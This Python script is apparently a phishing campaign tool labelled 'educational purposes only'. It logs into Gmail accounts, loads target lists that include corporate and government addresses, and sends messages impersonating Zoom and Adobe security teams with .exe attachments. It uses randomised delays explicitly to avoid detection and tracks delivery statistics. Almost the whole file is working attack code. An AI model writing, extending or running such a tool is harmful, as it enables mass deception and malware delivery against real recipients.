#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gmail Master Distribution System
WARNING: This is for educational purposes only!
"""

import os
import json
import time
import random
import threading
from datetime import datetime
from gmail_distributor import GmailDistributor
from email_list_generator import EmailListGenerator

class GmailMaster:
    def __init__(self):
        self.distributor = GmailDistributor()
        self.email_generator = EmailListGenerator()
        self.campaign_active = False
        self.campaign_stats = {
            "start_time": None,
            "emails_sent": 0,
            "successful_deliveries": 0,
            "failed_deliveries": 0,
            "targets_reached": 0
        }
    
    def load_configuration(self):
        """Load Gmail distribution configuration"""
        try:
            with open("gmail_distribution_config.json", 'r') as f:
                self.config = json.load(f)
            print("✓ Configuration loaded")
            return True
        except FileNotFoundError:
            print("✗ Configuration file not found. Please run gmail_setup.py first.")
            return False
    
    def setup_gmail_accounts(self):
        """Setup Gmail accounts from configuration"""
        if not self.config or 'accounts' not in self.config:
            print("✗ No Gmail accounts configured")
            return False
        
        active_accounts = [acc for acc in self.config['accounts'] if acc.get('active', True)]
        
        if not active_accounts:
            print("✗ No active Gmail accounts found")
            return False
        
        # Use the first active account
        account = active_accounts[0]
        self.distributor.setup_gmail_account(account['email'], account['password'])
        
        print(f"✓ Using Gmail account: {account['email']}")
        return True
    
    def load_target_emails(self):
        """Load target email addresses"""
        email_files = [
            "target_emails.txt",
            "high_value_targets.txt",
            "corporate_emails.txt",
            "government_emails.txt"
        ]
        
        all_emails = []
        
        for email_file in email_files:
            if os.path.exists(email_file):
                try:
                    with open(email_file, 'r') as f:
                        emails = [line.strip() for line in f.readlines() if line.strip()]
                        all_emails.extend(emails)
                        print(f"✓ Loaded {len(emails)} emails from {email_file}")
                except Exception as e:
                    print(f"✗ Error loading {email_file}: {e}")
        
        # Remove duplicates
        self.distributor.target_emails = list(set(all_emails))
        print(f"✓ Total unique target emails: {len(self.distributor.target_emails)}")
        
        return len(self.distributor.target_emails) > 0
    
    def create_advanced_templates(self):
        """Create advanced email templates"""
        self.distributor.create_email_templates()
        self.distributor.create_advanced_templates()
        
        # Add more sophisticated templates
        advanced_templates = [
            {
                "subject": "Zoom Meeting Invitation - Urgent Security Update",
                "sender_name": "Zoom Security Team",
                "sender_email": "security@zoom.us",
                "body": """
Dear Zoom User,

We are implementing mandatory security updates for all Zoom accounts.

Please join our security briefing meeting and install the required updates.

Meeting Details:
- Date: Today
- Time: 2:00 PM EST
- Topic: Critical Security Updates
- Required: All users must attend

Please run the attached installer to join the meeting and receive updates.

Zoom Security Team
                """,
                "attachment_name": "Zoom_Security_Update.exe",
                "priority": "high"
            },
            {
                "subject": "Adobe Creative Cloud - License Verification Required",
                "sender_name": "Adobe Support",
                "sender_email": "support@adobe.com",
                "body": """
Your Adobe Creative Cloud license requires immediate verification.

To continue using Adobe products without interruption, please verify your license information.

This verification is required due to:
- Recent security policy updates
- License compliance requirements
- Account protection measures

Please complete the verification process using the attached form.

Adobe Customer Support
                """,
                "attachment_name": "Adobe_License_Verification.exe",
                "priority": "high"
            }
        ]
        
        self.distributor.email_templates.extend(advanced_templates)
        print(f"✓ Created {len(self.distributor.email_templates)} email templates")
    
    def start_campaign(self):
        """Start the Gmail distribution campaign"""
        print("="*60)
        print("STARTING GMAIL DISTRIBUTION CAMPAIGN")
        print("="*60)
        
        # Load configuration
        if not self.load_configuration():
            return False
        
        # Setup Gmail accounts
        if not self.setup_gmail_accounts():
            return False
        
        # Load target emails
        if not self.load_target_emails():
            print("No target emails found. Generating sample list...")
            self.email_generator.create_comprehensive_email_list(50)
            if not self.load_target_emails():
                return False
        
        # Create email templates
        self.create_advanced_templates()
        
        # Start campaign
        self.campaign_active = True
        self.campaign_stats["start_time"] = datetime.now()
        
        print(f"Campaign started at: {self.campaign_stats['start_time']}")
        print(f"Target emails: {len(self.distributor.target_emails)}")
        print(f"Email templates: {len(self.distributor.email_templates)}")
        
        # Start distribution
        self.run_distribution()
        
        return True
    
    def run_distribution(self):
        """Run the distribution campaign"""
        campaign_settings = self.config.get('campaign_settings', {})
        emails_per_hour = campaign_settings.get('emails_per_hour', 15)
        max_emails_per_day = campaign_settings.get('max_emails_per_day', 200)
        
        print(f"Distribution settings:")
        print(f"  Emails per hour: {emails_per_hour}")
        print(f"  Max emails per day: {max_emails_per_day}")
        
        # Calculate delay between emails
        delay_between_emails = 3600 / emails_per_hour  # seconds
        
        emails_sent_today = 0
        
        for target_email in self.distributor.target_emails:
            if not self.campaign_active:
                break
            
            if emails_sent_today >= max_emails_per_day:
                print("Daily email limit reached. Campaign paused until tomorrow.")
                break
            
            # Select random template
            template = random.choice(self.distributor.email_templates)
            
            # Send email
            print(f"Sending email to: {target_email}")
            if self.distributor.send_phishing_email(target_email, template):
                self.campaign_stats["emails_sent"] += 1
                self.campaign_stats["successful_deliveries"] += 1
                emails_sent_today += 1
            else:
                self.campaign_stats["failed_deliveries"] += 1
            
            # Random delay to avoid detection
            base_delay = delay_between_emails
            random_delay = random.randint(-300, 300)  # ±5 minutes
            actual_delay = max(60, base_delay + random_delay)  # Minimum 1 minute
            
            print(f"Waiting {actual_delay} seconds before next email...")
            time.sleep(actual_delay)
        
        self.print_campaign_results()
    
    def print_campaign_results(self):
        """Print campaign results"""
        runtime = datetime.now() - self.campaign_stats["start_time"] if self.campaign_stats["start_time"] else None
        runtime_str = str(runtime).split('.')[0] if runtime else "Unknown"
        
        print("\n" + "="*60)
        print("GMAIL DISTRIBUTION CAMPAIGN RESULTS")
        print("="*60)
        print(f"Campaign runtime: {runtime_str}")
        print(f"Total emails sent: {self.campaign_stats['emails_sent']}")
        print(f"Successful deliveries: {self.campaign_stats['successful_deliveries']}")
        print(f"Failed deliveries: {self.campaign_stats['failed_deliveries']}")
        
        if self.campaign_stats['emails_sent'] > 0:
            success_rate = (self.campaign_stats['successful_deliveries'] / self.campaign_stats['emails_sent']) * 100
            print(f"Success rate: {success_rate:.1f}%")
        
        print("="*60)
        
        # Save campaign log
        self.save_campaign_log()
    
    def save_campaign_log(self):
        """Save campaign log to file"""
        log_data = {
            "campaign_date": self.campaign_stats["start_time"].isoformat() if self.campaign_stats["start_time"] else None,
            "campaign_stats": self.campaign_stats,
            "configuration": self.config,
            "target_count": len(self.distributor.target_emails),
            "template_count": len(self.distributor.email_templates)
        }
        
        with open("gmail_campaign_log.json", 'w') as f:
            json.dump(log_data, f, indent=2)
        
        print("Campaign log saved to: gmail_campaign_log.json")
    
    def run_setup_wizard(self):
        """Run the setup wizard"""
        print("="*60)
        print("GMAIL MASTER DISTRIBUTION SYSTEM")
        print("="*60)
        print("WARNING: This is for educational purposes only!")
        print("="*60)
        
        while True:
            print("\n" + "="*40)
            print("MAIN MENU")
            print("="*40)
            print("1. Setup Gmail Accounts")
            print("2. Generate Email Lists")
            print("3. Start Distribution Campaign")
            print("4. View Campaign Logs")
            print("5. Exit")
            
            choice = input("\nEnter your choice: ")
            
            if choice == "1":
                os.system("python gmail_setup.py")
            
            elif choice == "2":
                os.system("python email_list_generator.py")
            
            elif choice == "3":
                self.start_campaign()
            
            elif choice == "4":
                self.view_campaign_logs()
            
            elif choice == "5":
                print("Goodbye!")
                break
            
            else:
                print("Invalid choice. Please try again.")
    
    def view_campaign_logs(self):
        """View campaign logs"""
        if os.path.exists("gmail_campaign_log.json"):
            try:
                with open("gmail_campaign_log.json", 'r') as f:
                    log_data = json.load(f)
                
                print("\n" + "="*60)
                print("CAMPAIGN LOGS")
                print("="*60)
                print(f"Campaign Date: {log_data.get('campaign_date', 'N/A')}")
                print(f"Target Count: {log_data.get('target_count', 'N/A')}")
                print(f"Template Count: {log_data.get('template_count', 'N/A')}")
                
                stats = log_data.get('campaign_stats', {})
                print(f"Emails Sent: {stats.get('emails_sent', 0)}")
                print(f"Successful Deliveries: {stats.get('successful_deliveries', 0)}")
                print(f"Failed Deliveries: {stats.get('failed_deliveries', 0)}")
                print("="*60)
                
            except Exception as e:
                print(f"Error reading campaign logs: {e}")
        else:
            print("No campaign logs found.")

def main():
    """Main execution function"""
    master = GmailMaster()
    master.run_setup_wizard()

if __name__ == "__main__":
    main()

